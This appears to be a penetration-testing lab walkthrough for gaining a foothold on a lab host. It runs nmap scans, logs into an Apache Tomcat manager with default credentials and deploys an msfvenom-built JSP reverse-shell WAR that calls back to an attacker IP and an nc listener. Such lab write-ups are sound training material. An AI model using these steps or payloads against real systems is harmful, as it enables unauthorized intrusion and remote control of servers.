Getting a Foothold

Getting a Foothold

# 1. NMAP Scans
TCP Connect Scan with service detection on all ports. We see 6 ports open.
`sudo nmap -sV -sT -p- 10.11.1.209`
![5ab1b8a7b6179ee79203b72d5f727b5e.png](508fb960b86f4634addedb825fcff36e.png)

No Ping scan with service detection, and run different scripts. Of interest in this output are the Apache Tomcat credentials from http-default-accounts script on port 8080
`sudo nmap -Pn -A -p- -sV --script default,safe,auth,vuln --max-retries 4 10.11.1.209`
![268a71e6b03a9c11ab844285811c5d1d.png](d21c9008f042461dabff02b15de00d4a.png)

# 2. Browse to the Apache Tomcat webpage. 
![2b9a8436561a1dc67640aaa2c80c4bf9.png](3779723eb10b45899f317d0efa589e86.png)

Enter the credentials --> tomcat:s3cret
[http://10.11.1.209:8080/manager/html](http://10.11.1.209:8080/manager/html)
![bd4784134a52933c1aff8d4b20cd1f1c.png](dff73667ddd745bd90137256189ebd73.png)


# 3. Notice that you can upload a WAR file in the Deploy table
![c31b39282133be9549b3287d79ec6937.png](07424de07cf744f9a2cdcae4cb113624.png)

# 4. Create a WAR shellcode file using msfvenom
`msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.119.214 lport=5678 -f war > shell.war`
![971d34fa0aab76565f3c05278f620899.png](365f0331f05b4466a2b638372fce51f6.png)

# 5. Upload shell.war, then press the Deploy button 
![d06a1cea631a4c13824462b3716663ef.png](f2c4453a20a44b65a351d2719f14d4cf.png)

6. You'll see the shell listed in the Applications table
[http://10.11.1.209:8080/manager/html](http://10.11.1.209:8080/manager/html)
![9f75f0070d1eb3d729ea9beea6aa4250.png](e9a88faeb2c14764a3695b51e78056cb.png)

# 7. Start an nc listener
![9749751d284a19f61b6bc3af4f488ead.png](3b2dad634fd749bc8507fc2f6a13165c.png)

# 8. Execute the war file by clicking on the shell.war path listed in the Applications table. 
![77a5c2975b54ddd5a0236ac785258ca8.png](e775da5026df473495d24ad435371a30.png)
Notice the webpage becomes blank
![406f1cdd7a8c70c9498024114bf898d9.png](44a55175bac64ba8bde51d83921e2d0e.png)

# 9. We have a shell on the nc listener. Check which user we are, then get a upgrade the shell.
`whoami`
`script /dev/null`
![2dd6610c1790c99d1a24025a8435c1f3.png](0998278d494a451193ec2e999f18f84c.png)











